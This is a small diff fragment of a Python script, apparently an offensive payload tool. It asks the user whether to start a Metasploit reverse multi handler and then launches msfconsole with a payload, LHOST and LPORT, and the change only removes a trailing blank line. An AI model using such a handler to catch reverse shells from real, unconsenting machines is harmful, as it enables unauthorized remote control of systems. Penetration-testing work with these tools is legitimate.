@@ -107,4 +107,3 @@ start_handler = input("Start reverse multi handler in Metasploit? (y/n) ")
 
 if start_handler.lower() == "y":
     os.system(f"msfconsole -x 'use exploit/multi/handler; set PAYLOAD {payload}; set LHOST {lhost}; set LPORT {lport}; exploit'")
-
